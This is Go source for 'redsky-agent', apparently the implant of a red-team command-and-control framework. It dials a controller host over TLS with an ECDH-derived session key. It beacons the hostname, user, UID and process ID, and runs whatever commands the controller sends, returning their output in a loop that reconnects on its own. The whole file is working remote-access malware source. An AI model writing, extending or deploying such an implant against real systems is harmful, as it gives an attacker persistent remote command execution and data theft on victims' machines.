// redsky-agent — the implant.
// Phase 5: persistent connection. One TLS + ECDH handshake, then a loop that
// reads tasks, executes them, and sends results until the core closes the
// connection or sends a kill.
package main

import (
	"bytes"
	"crypto/tls"
	"encoding/base64"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"log"
	"math/rand"
	"net"
	"os"
	"os/exec"
	"os/user"
	"runtime"
	"sync"
	"time"

	"github.com/sk666G/red-sky---arsenal/internal/crypto"
	"github.com/sk666G/red-sky---arsenal/internal/proto"
	rsTLS "github.com/sk666G/red-sky---arsenal/internal/tls"
	"github.com/sk666G/red-sky---arsenal/internal/wire"
)

func main() {
	host := flag.String("host", "127.0.0.1", "core host")
	port := flag.Int("port", 4444, "core port")
	tag := flag.String("tag", "", "agent tag (used to derive ID)")
	caFP := flag.String("ca-fingerprint", "", "SHA-256 fingerprint of the engagement CA (colon hex)")
	beaconSec := flag.Int("beacon", 30, "beacon interval seconds (heartbeat on the live connection)")
	reconnectSec := flag.Int("reconnect", 10, "reconnect delay after disconnect")
	flag.Parse()

	if *caFP == "" {
		log.Fatalf("no -ca-fingerprint given; get it from core's startup log")
	}

	agentID := *tag
	if agentID == "" {
		agentID = fmt.Sprintf("rs-%08x", rand.Uint32())
	}

	log.Printf("redsky-agent starting id=%s target=%s:%d", agentID, *host, *port)

	for {
		if err := runSession(*host, *port, agentID, *caFP, *beaconSec); err != nil {
			log.Printf("session ended: %v", err)
		}
		time.Sleep(time.Duration(*reconnectSec) * time.Second)
	}
}

// runSession opens one connection and services it until it dies.
func runSession(host string, port int, agentID, caFP string, beaconSec int) error {
	tlsCfg, err := rsTLS.ClientTLSConfig(caFP)
	if err != nil {
		return fmt.Errorf("tls config: %w", err)
	}
	rawConn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:%d", host, port), 10*time.Second)
	if err != nil {
		return fmt.Errorf("dial: %w", err)
	}
	defer rawConn.Close()
	conn := tls.Client(rawConn, tlsCfg)
	if err := conn.Handshake(); err != nil {
		return fmt.Errorf("tls handshake: %w", err)
	}

	// --- ECDH handshake ---
	frame, err := wire.ReadFrame(conn)
	if err != nil {
		return fmt.Errorf("read hello: %w", err)
	}
	var hello map[string]string
	if err := json.Unmarshal(frame.Payload, &hello); err != nil {
		return fmt.Errorf("bad hello: %w", err)
	}
	if hello["type"] != "ecdh_hello" {
		return fmt.Errorf("expected ecdh_hello, got %s", hello["type"])
	}
	corePub, err := base64.StdEncoding.DecodeString(hello["pubkey"])
	if err != nil {
		return fmt.Errorf("bad core pubkey: %w", err)
	}
	agentKey, err := crypto.GenerateEphemeralKey()
	if err != nil {
		return fmt.Errorf("gen key: %w", err)
	}
	reply := map[string]string{
		"type":   "ecdh_reply",
		"pubkey": base64.StdEncoding.EncodeToString(agentKey.PublicKey().Bytes()),
	}
	replyRaw, _ := json.Marshal(reply)
	if err := wire.WriteFrame(conn, 0, replyRaw); err != nil {
		return fmt.Errorf("send reply: %w", err)
	}
	key, err := crypto.DeriveKey(agentKey, corePub)
	if err != nil {
		return fmt.Errorf("derive key: %w", err)
	}
	sess, err := crypto.NewSession(key)
	if err != nil {
		return fmt.Errorf("new session: %w", err)
	}

	// --- initial beacon ---
	var writeMu sync.Mutex
	send := func(t proto.MessageType, payload any) error {
		writeMu.Lock()
		defer writeMu.Unlock()
		return sendEncrypted(conn, sess, t, payload)
	}
	if err := send(proto.TypeBeacon, proto.Beacon{
		AgentID: agentID,
		Info:    collectInfo(),
		TS:      time.Now().Unix(),
	}); err != nil {
		return fmt.Errorf("send beacon: %w", err)
	}

	// --- heartbeat goroutine ---
	stopBeacon := make(chan struct{})
	go func() {
		t := time.NewTicker(time.Duration(beaconSec) * time.Second)
		defer t.Stop()
		for {
			select {
			case <-stopBeacon:
				return
			case <-t.C:
				_ = send(proto.TypeBeacon, proto.Beacon{
					AgentID: agentID,
					Info:    collectInfo(),
					TS:      time.Now().Unix(),
				})
			}
		}
	}()
	defer close(stopBeacon)

	// --- task loop ---
	for {
		frame, err := wire.ReadFrame(conn)
		if err != nil {
			if err == io.EOF {
				return fmt.Errorf("core closed connection")
			}
			return fmt.Errorf("read frame: %w", err)
		}
		if frame.Flags&wire.FlagEncrypted == 0 {
			return fmt.Errorf("unexpected plaintext frame")
		}
		plain, err := sess.Decrypt(frame.Payload)
		if err != nil {
			return fmt.Errorf("decrypt: %w", err)
		}
		var env proto.Envelope
		if err := json.Unmarshal(plain, &env); err != nil {
			return fmt.Errorf("envelope: %w", err)
		}
		switch env.Type {
		case proto.TypeTask:
			var task proto.Task
			if err := json.Unmarshal(env.Payload, &task); err != nil {
				continue
			}
			log.Printf("task %s: %s %v", task.ID, task.Cmd, task.Args)
			result := runTask(task)
			if err := send(proto.TypeResult, result); err != nil {
				return fmt.Errorf("send result: %w", err)
			}
		case proto.TypeSleep:
			var s proto.Sleep
			_ = json.Unmarshal(env.Payload, &s)
			log.Printf("sleep request %dms (not implemented in phase 5)", s.MS)
		case proto.TypeKill:
			log.Printf("kill requested, exiting")
			os.Exit(0)
		default:
			log.Printf("unknown message type: %s", env.Type)
		}
	}
}

func collectInfo() proto.AgentInfo {
	hostname, _ := os.Hostname()
	usr := "?"
	uid := -1
	if u, err := user.Current(); err == nil {
		usr = u.Username
		fmt.Sscanf(u.Uid, "%d", &uid)
	}
	return proto.AgentInfo{
		Hostname: hostname,
		OS:       runtime.GOOS,
		Arch:     runtime.GOARCH,
		User:     usr,
		UID:      uid,
		PID:      os.Getpid(),
		Capabilities: []string{"exec", "file_get", "file_put", "tls", "aes-gcm"},
	}
}

func runTask(t proto.Task) proto.Result {
	timeout := time.Duration(t.Timeout) * time.Second
	if timeout == 0 {
		timeout = 60 * time.Second
	}
	cmd := exec.Command(t.Cmd, t.Args...)
	var stdout, stderr bytes.Buffer
	cmd.Stdout = &stdout
	cmd.Stderr = &stderr
	done := make(chan error, 1)
	if err := cmd.Start(); err != nil {
		return proto.Result{TaskID: t.ID, Error: err.Error(), ExitCode: -1}
	}
	go func() { done <- cmd.Wait() }()
	select {
	case err := <-done:
		rc := 0
		if err != nil {
			if ee, ok := err.(*exec.ExitError); ok {
				rc = ee.ExitCode()
			} else {
				rc = -1
			}
		}
		return proto.Result{TaskID: t.ID, Stdout: stdout.String(), Stderr: stderr.String(), ExitCode: rc}
	case <-time.After(timeout):
		_ = cmd.Process.Kill()
		return proto.Result{TaskID: t.ID, Error: "timeout", ExitCode: -1}
	}
}

func sendEncrypted(conn net.Conn, sess *crypto.Session, t proto.MessageType, payload any) error {
	raw, err := json.Marshal(payload)
	if err != nil {
		return err
	}
	env := proto.Envelope{Type: t, Payload: raw}
	envBytes, err := json.Marshal(env)
	if err != nil {
		return err
	}
	enc, err := sess.Encrypt(envBytes)
	if err != nil {
		return err
	}
	return wire.WriteFrame(conn, wire.FlagEncrypted, enc)
}
